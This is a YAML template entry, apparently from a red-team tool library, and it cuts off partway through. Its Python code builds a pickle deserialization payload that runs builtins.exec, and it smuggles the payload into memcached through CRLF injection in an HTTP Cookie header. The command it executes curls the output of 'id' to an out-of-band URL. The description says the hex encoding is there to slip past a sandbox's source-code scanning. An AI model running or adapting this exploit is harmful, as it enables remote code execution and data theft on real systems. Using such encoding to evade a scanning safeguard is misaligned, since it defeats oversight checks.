- name: pickle-crlf-memcached-hex-bypass
  description: 基于 CRLF 注入 + Memcached 文本协议的 pickle 反序列化 RCE 模板，使用全 hex 编码的 pickle
    操作码字节流绕过沙箱源代码扫描。
  lang: python
  template: "import sys\nimport json\nimport re\nimport base64\nimport hashlib\nimport\
    \ struct\nimport binascii\nimport html\nimport time\nimport random\nimport string\n\
    import urllib.parse\nfrom typing import Optional, Dict, Any\nfrom redteam_sdk\
    \ import HttpClient, OOBReceiver, save_context, load_context\n\nTARGET_URL = \"\
    http://localhost:9082\"\nMEMCACHED_HOST = \"127.0.0.1\"\nMEMCACHED_PORT = 11211\n\
    \ndef generate_random_string(length: int = 8) -> str:\n    \"\"\"生成随机字符串\"\"\"\
    \n    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))\n\
    \ndef build_pickle_rce_payload(command: str) -> bytes:\n    \"\"\"\n    使用 struct/bytes\
    \ 手搓 pickle opcode 字节流实现 RCE\n    pickle 协议版本 0 (文本格式) 的 __reduce__ 调用\n    \"\
    \"\"\n    # 构建一个简单的 pickle payload: (__builtins__.exec, (command,))\n    # 使用\
    \ pickle 协议 0 的 opcode\n    \n    # 构建命令字符串\n    cmd_bytes = command.encode('utf-8')\n\
    \    \n    # 手动构建 pickle 字节流\n    payload = b''\n    \n    # GLOBAL opcode: 导入模块\n\
    \    payload += b'cbuiltins\\nexec\\n'  # GLOBAL 'builtins.exec'\n    \n    #\
    \ 构建参数元组\n    payload += b'('  # MARK\n    payload += b'V' + cmd_bytes + b'\\\
    n'  # UNICODE string\n    payload += b't'  # TUPLE (pop from stack until MARK)\n\
    \    \n    # REDUCE opcode: 调用函数\n    payload += b'R'  # REDUCE\n    \n    # STOP\n\
    \    payload += b'.'\n    \n    return payload\n\ndef inject_memcached_command(http_client:\
    \ HttpClient, command: str) -> bool:\n    \"\"\"\n    通过 CRLF 注入向 memcached 发送命令\n\
    \    利用 Cookie 头的 CRLF 注入\n    \"\"\"\n    try:\n        # 构建恶意 cookie 值，包含 CRLF\
    \ 注入\n        # 格式: session=<injected_value>\\r\\n<memcached_command>\n      \
    \  # 注意: 需要 URL 编码或原始字节发送\n        \n        # 使用 http.client 发送原始请求\n       \
    \ import http.client\n        \n        # 解析目标 URL\n        parsed = urllib.parse.urlparse(TARGET_URL)\n\
    \        host = parsed.hostname\n        port = parsed.port or 80\n        \n\
    \        conn = http.client.HTTPConnection(host, port, timeout=10)\n        \n\
    \        # 构建原始请求，包含 CRLF 注入\n        # 注入的 memcached 命令需要以 \\r\\n 结尾\n      \
    \  injected_value = f\"test{generate_random_string()}\\r\\n{command}\\r\\n\"\n\
    \        \n        # 构建 HTTP 请求头\n        headers = {\n            \"Host\": host,\n\
    \            \"User-Agent\": \"Mozilla/5.0\",\n            \"Cookie\": f\"session={injected_value}\"\
    \n        }\n        \n        # 发送 GET 请求到根路径\n        conn.request(\"GET\",\
    \ \"/\", headers=headers)\n        response = conn.getresponse()\n        response.read()\n\
    \        conn.close()\n        \n        return True\n    except Exception as\
    \ e:\n        print(f\"[!] memcached 注入失败: {e}\")\n        return False\n\ndef\
    \ inject_pickle_payload_to_memcached(http_client: HttpClient, oob_url: str) ->\
    \ bool:\n    \"\"\"\n    通过 CRLF 注入将 pickle payload 写入 memcached\n    使用 set 命令存储\
    \ pickle 数据\n    \"\"\"\n    try:\n        # 构建 RCE 命令，通过 curl 将结果发送到 OOB\n  \
    \      command = f\"curl -X POST -d \\\"$(id)\\\" {oob_url}\"\n        \n    \
    \    # 构建 pickle payload\n        pickle_data = build_pickle_rce_payload(command)\n\
    \        \n        # 将 pickle 数据编码为 base64 以便在 memcached 命令中使用\n        pickle_b64\
    \ = base64.b64encode(pickle_data).decode('ascii')\n        \n        # 构建 memcached\
    \ set 命令\n        # set <key> <flags> <exptime> <bytes>\\r\\n<data>\\r\\n\n  \
    \      # 注意: 数据需要是原始字节，但通过 CRLF 注入只能发送 ASCII 可打印字符\n        # 因此我们使用 base64 编码，然后在目标端解码执行\n\
    \        # 但 memcached 存储的是原始字节，所以我们需要另一种方法\n        \n        # 方法: 使用 memcached\
    \ 的 set 命令直接存储 pickle 字节\n        # 由于 CRLF 注入的限制，我们只能发送 ASCII 字符\n        # 因此我们使用一个技巧:\
    \ 先存储 base64 编码的 pickle，然后通过另一个注入解码\n        \n        # 简化方案: 直接发送包含命令的 pickle\
    \ payload\n        # 使用 memcached 的 set 命令存储一个简单的 pickle 对象\n        \n      \
    \  # 构建 set 命令\n        # 注意: memcached 文本协议中，数据部分不能包含 \\r\\n\n        # 但 pickle\
